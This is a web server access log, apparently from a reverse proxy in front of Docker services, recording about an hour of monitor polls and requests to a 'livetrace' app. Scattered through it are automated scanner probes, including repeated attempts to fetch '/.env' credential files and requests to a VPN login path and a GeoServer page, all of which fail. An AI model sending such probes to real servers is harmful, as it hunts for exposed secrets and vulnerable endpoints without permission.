4.26.29.194 - - [15/Dec/2023:02:15:13 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 1024 "-" "-" 4513 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:02:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4514 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4515 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4516 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [15/Dec/2023:02:16:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4517 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:02:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4518 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:47 +0000] "GET /trace/ HTTP/2.0" 200 751 "-" "-" 4519 "livetrace@docker" "http://172.25.0.5:80" 33ms
4.26.29.194 - - [15/Dec/2023:02:16:47 +0000] "GET /trace/start.php?id=0wxrpaptd HTTP/2.0" 200 101 "-" "-" 4520 "livetrace@docker" "http://172.25.0.5:80" 5ms
4.26.29.194 - - [15/Dec/2023:02:16:48 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 223 "-" "-" 4521 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:49 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 295 "-" "-" 4522 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:50 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 367 "-" "-" 4523 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:51 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 439 "-" "-" 4524 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:52 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 511 "-" "-" 4525 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:16:53 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 583 "-" "-" 4526 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:16:54 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 655 "-" "-" 4527 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:55 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 727 "-" "-" 4528 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:16:56 +0000] "GET /trace/poll.php?id=0wxrpaptd HTTP/2.0" 200 1024 "-" "-" 4529 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4530 "www@docker" "http://172.25.0.8:80" 17ms
167.71.120.76 - - [15/Dec/2023:02:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4531 "www@docker" "http://172.25.0.8:80" 15ms
159.203.109.206 - - [15/Dec/2023:02:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4532 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4533 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4534 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4535 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4536 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4537 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4538 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4539 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4540 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4541 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4542 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4543 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4544 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4545 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.56 - - [15/Dec/2023:02:25:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4546 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4547 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4548 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4549 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.52 - - [15/Dec/2023:02:26:24 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4550 "-" "-" 0ms
64.62.197.50 - - [15/Dec/2023:02:26:33 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 4551 "-" "-" 0ms
64.62.197.52 - - [15/Dec/2023:02:26:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4552 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:02:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4553 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.55 - - [15/Dec/2023:02:26:53 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 4554 "-" "-" 0ms
64.62.197.58 - - [15/Dec/2023:02:26:59 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 4555 "-" "-" 0ms
64.62.197.60 - - [15/Dec/2023:02:27:13 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 4556 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4557 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4558 "www@docker" "http://172.25.0.8:80" 1ms
184.105.139.67 - - [15/Dec/2023:02:28:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4559 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4560 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4561 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4562 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4563 "www@docker" "http://172.25.0.8:80" 0ms
184.105.139.67 - - [15/Dec/2023:02:29:40 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4564 "-" "-" 0ms
184.105.139.67 - - [15/Dec/2023:02:29:47 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 4565 "-" "-" 0ms
184.105.139.67 - - [15/Dec/2023:02:29:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4566 "-" "-" 0ms
184.105.139.67 - - [15/Dec/2023:02:30:06 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 4567 "-" "-" 0ms
184.105.139.67 - - [15/Dec/2023:02:30:12 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 4568 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4569 "www@docker" "http://172.25.0.8:80" 0ms
184.105.139.67 - - [15/Dec/2023:02:30:26 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 4570 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:02:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4571 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4572 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4573 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:31:40 +0000] "GET /trace/ HTTP/2.0" 200 751 "-" "-" 4574 "livetrace@docker" "http://172.25.0.5:80" 5007ms
4.26.29.194 - - [15/Dec/2023:02:31:46 +0000] "GET /trace/styles.css HTTP/2.0" 499 21 "-" "-" 4575 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:31:46 +0000] "GET /trace/start.php?id=dsjnoqvy1 HTTP/2.0" 200 101 "-" "-" 4576 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:02:31:47 +0000] "GET /trace/poll.php?id=dsjnoqvy1 HTTP/2.0" 200 223 "-" "-" 4577 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:31:48 +0000] "GET /trace/poll.php?id=dsjnoqvy1 HTTP/2.0" 200 295 "-" "-" 4578 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:31:49 +0000] "GET /trace/poll.php?id=dsjnoqvy1 HTTP/2.0" 200 367 "-" "-" 4579 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:31:51 +0000] "GET /trace/poll.php?id=dsjnoqvy1 HTTP/2.0" 200 439 "-" "-" 4580 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:31:52 +0000] "GET /trace/poll.php?id=dsjnoqvy1 HTTP/2.0" 200 511 "-" "-" 4581 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4582 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4583 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4584 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4585 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4586 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4587 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [15/Dec/2023:02:35:13 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4588 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:02:35:13 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4589 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4590 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4591 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4592 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4593 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4594 "www@docker" "http://172.25.0.8:80" 31ms
167.71.120.76 - - [15/Dec/2023:02:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4595 "www@docker" "http://172.25.0.8:80" 21ms
185.224.128.191 - - [15/Dec/2023:02:38:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4596 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4597 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4598 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4599 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4600 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4601 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4602 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4603 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4604 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4605 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:42:37 +0000] "GET /trace/ HTTP/2.0" 200 892 "-" "-" 4606 "livetrace@docker" "http://172.25.0.5:80" 40ms
4.26.29.194 - - [15/Dec/2023:02:42:37 +0000] "GET /trace/start.php?id=bmzfg6mm2 HTTP/2.0" 200 101 "-" "-" 4607 "livetrace@docker" "http://172.25.0.5:80" 4ms
167.71.120.76 - - [15/Dec/2023:02:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4608 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:42:38 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 223 "-" "-" 4609 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:42:39 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 295 "-" "-" 4610 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:42:40 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 367 "-" "-" 4611 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:42:41 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 439 "-" "-" 4612 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:42:42 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 511 "-" "-" 4613 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:42:43 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 583 "-" "-" 4614 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:42:44 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 655 "-" "-" 4615 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:42:45 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 727 "-" "-" 4616 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:42:46 +0000] "GET /trace/poll.php?id=bmzfg6mm2 HTTP/2.0" 200 1024 "-" "-" 4617 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4618 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4619 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4620 "www@docker" "http://172.25.0.8:80" 0ms
185.224.128.191 - - [15/Dec/2023:02:44:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4621 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:02:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4622 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4623 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4624 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4625 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4626 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4627 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4628 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4629 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4630 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4631 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4632 "www@docker" "http://172.25.0.8:80" 1ms
35.240.121.17 - - [15/Dec/2023:02:49:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4633 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4634 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4635 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4636 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4637 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4638 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4639 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4640 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [15/Dec/2023:02:53:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4641 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:02:53:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4642 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:02:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4643 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4644 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4645 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4646 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4647 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4648 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4649 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4650 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4651 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4652 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4653 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4654 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4655 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4656 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4657 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4658 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4659 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4660 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4661 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4662 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4663 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:03:04:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4664 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4665 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4666 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4667 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4668 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4669 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4670 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4671 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4672 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4673 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [15/Dec/2023:03:08:26 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4674 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:03:08:26 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4675 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:03:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4676 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4677 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4678 "www@docker" "http://172.25.0.8:80" 1ms
57.129.23.166 - - [15/Dec/2023:03:10:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4679 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:03:10:18 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4680 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4681 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4682 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4683 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4684 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4685 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4686 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4687 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4688 "www@docker" "http://172.25.0.8:80" 0ms
